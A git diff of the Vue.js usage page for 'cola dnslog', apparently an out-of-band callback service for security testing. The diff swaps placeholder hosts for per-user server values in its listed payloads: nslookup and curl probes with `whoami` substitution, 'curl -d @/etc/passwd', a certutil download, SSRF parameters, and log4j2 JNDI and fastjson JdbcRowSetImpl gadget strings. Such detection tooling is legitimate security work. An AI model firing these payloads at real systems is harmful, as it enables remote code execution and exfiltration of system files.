@@ -1,30 +1,32 @@
 <template>
   <div class="app-container">
     <el-row :gutter="20">
-      <el-col :span="18" :xs="24">
+      <el-col :span="24" :xs="24">
         <el-card>
+          <div>
+            <a href="/"><img src="/dnslog_thin.png" alt="cola dnslog" width="150px"></a>
+          </div>
+          <hr>
           <div class="user-usage">
+            <h1>Usage</h1>
             <div class="post">
               <h2><a href="/#/dnslog/index">Dnslog</a></h2>
               <p>
                 RCE:
-                <el-tag class="command-tag" size="small" type="success">nslookup `whoami`.xxx.{{ example_domain }}
-                </el-tag>
+                <code>nslookup `whoami`.{{ my_domain }}</code>
                 &nbsp;
-                <el-tag class="command-tag" size="small" type="success">ping `whoami`.xxx.{{ example_domain }}</el-tag>
+                <code>ping `whoami`.{{ my_domain }}</code>
                 <br>
                 log4j2:
-                <el-tag class="command-tag" size="small" type="success">${jndi:ldap://ldap.xxx.{{ example_domain }}/123}
-                </el-tag>
+                <code>${jndi:ldap://ldap.{{ my_domain }}/123}</code>
                 &nbsp;
-                <el-tag class="command-tag" size="small" type="success">${jndi:rmi://rmi.xxx.{{ example_domain }}/123}
-                </el-tag>
+                <code>${jndi:rmi://rmi.{{ my_domain }}/123}</code>
                 <br>
                 fastjson:
-                <code class="command-tag" size="small" type="success">{
+                <code>{
                   "b":{
                   "@type":"com.sun.rowset.JdbcRowSetImpl",
-                  "dataSourceName":"rmi://fastjson.xxx.{{ example_domain }}/Exploit",
+                  "dataSourceName":"rmi://fastjson.{{ my_domain }}/Exploit",
                   "autoCommit":true
                   }
                   }
@@ -33,48 +35,46 @@
             </div>
             <div class="post">
               <h2><a href="/#/httplog/index">Httplog</a></h2>
+              Support GET POST HEAD request.
+              <br>
               <p>
                 RCE:
-                <el-tag class="command-tag" size="small" type="success">curl `whoami`.{{ example_ip }}</el-tag>
+                <code>curl `whoami`.{{ http }}</code>
                 &nbsp;
-                <el-tag class="command-tag" size="small" type="success">curl -d @/etc/passwd {{ example_ip }}
-                </el-tag>
+                <code>curl -d @/etc/passwd {{ http }}</code>
                 &nbsp;
-                <el-tag class="command-tag" size="small" type="success">certutil -urlcache -split -f
-                  http://{{ example_ip }}/x x</el-tag>
+                <code>certutil -urlcache -split -f
+                  http://{{ http }}/x x</code>
                 <br>
                 SSRF:
-                <el-tag class="command-tag" size="small" type="success">?url=http://{{ example_ip }}/x</el-tag>
+                <code>?url=http://{{ http }}/x</code>
               </p>
             </div>
             <div class="post">
               <h2><a href="/#/ldaplog/index">Ldaplog</a></h2>
               <p>
                 log4j2:
-                <el-tag class="command-tag" size="small" type="success">${jndi:ldap://{{ example_ip }}:1389/Exploit}
-                </el-tag>
+                <code>${jndi:ldap://{{ ldap }}/xxxx{{ logid }}}</code>
                 <br>
                 fastjson:
-                <el-tag class="command-tag" size="small" type="success">
-                  {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{{ example_ip }}:1389/Exploit",
-                  "autoCommit":true}</el-tag>
+                <code>{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{{ ldap }}/xxxx{{ logid }}",
+                  "autoCommit":true}</code>
               </p>
             </div>
             <div class="post">
               <h2><a href="/#/rmilog/index">Rmilog</a></h2>
               <p>
                 log4j2:
-                <el-tag class="command-tag" size="small" type="success">${jndi:rmi://{{ example_ip }}:1099/Exploit}
-                </el-tag>
+                <code>${jndi:rmi://{{ rmi }}/xxxx{{ logid }}}</code>
                 <br>
                 fastjson:
-                <el-tag class="command-tag" size="small" type="success">{
+                <code>{
                   "b":{
                   "@type":"com.sun.rowset.JdbcRowSetImpl",
-                  "dataSourceName":"rmi://{{ example_ip }}:1099/Exploit",
+                  "dataSourceName":"rmi://{{ rmi }}/xxxx{{ logid }}",
                   "autoCommit":true
                   }
-                  }</el-tag>
+                  }</code>
               </p>
             </div>
           </div>
@@ -85,52 +85,32 @@
 </template>
 
 <script>
-import { getInfo } from '@/api/user'
+import { getMyServerinfo } from '@/api/user'
 
 export default {
-  name: "Usage",
+  name: 'Usage',
   data() {
     return {
       userinfo: {},
-      example_domain: 'example.com',
-      example_ip: '1.1.1.1'
+      my_domain: '',
+      http: '',
+      ldap: '',
+      rmi: '',
+      logid: ''
     }
   },
   mounted() {
     this.formKeyArr = []
-    this.getList()
+    this.getInfo()
   },
   methods: {
-    getList() {
-      getInfo()
-        .then((res) => {
-          console.log(res)
-          this.listLoading = true
-          this.userinfo = res.data
-          setTimeout(() => {
-            this.listLoading = false
-          }, 1.5 * 1000)
-        })
-    },
-    Submit() {
-      const postdata = {}
-      postdata['dingtalk_robot_token'] = this.userinfo.dingtalk_robot_token ? this.userinfo.dingtalk_robot_token : ''
-      postdata['bark_url'] = this.userinfo.bark_url ? this.userinfo.bark_url : ''
-      postdata['logid'] = this.userinfo.logid ? this.userinfo.logid : ''
-      console.log(postdata)
-      updateInfo(postdata).then((res) => {
-        this.$notify({
-          title: '成功',
-          message: '更新成功',
-          type: 'success'
-        });
-        this.getList()
-      }).catch((err) => {
-        this.$notify.error({
-          title: '失败',
-          message: err,
-        });
-        this.getList()
+    getInfo() {
+      getMyServerinfo().then((res) => {
+        this.my_domain = res.data.domain
+        this.http = res.data.http
+        this.ldap = res.data.ldap
+        this.rmi = res.data.rmi
+        this.logid = res.data.logid
       })
     }
   }
@@ -222,5 +202,21 @@ export default {
 
 .text-muted {
   color: #777;
+}
+
+code {
+  font-size: 15px;
+  border: 1px solid rgb(208, 245, 224);
+  background-color: rgb(231, 250, 240);
+  border-radius: 4px;
+  color: rgb(3, 148, 68);
+  padding: 0px 8px;
+  margin: 0 0 0 10px;
+}
+
+p {
+  line-height: 1.5;
+  border-left: 5px solid #6900d2;
+  padding-left: 10px;
 }
 </style>
